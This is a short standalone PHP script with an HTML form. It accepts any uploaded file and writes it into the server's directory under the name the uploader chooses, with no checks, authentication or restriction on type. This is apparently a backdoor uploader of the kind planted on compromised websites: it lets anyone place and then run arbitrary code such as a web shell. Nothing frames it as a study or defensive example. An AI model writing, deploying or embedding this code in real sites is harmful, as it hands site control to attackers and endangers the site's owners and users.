<form enctype="multipart/form-data" method="post">
<input type="file" name="f">
<input type="submit" name="go" value="G0!">
</form>
<?php
if($_POST['go']){
	set_time_limit(0);
	move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}
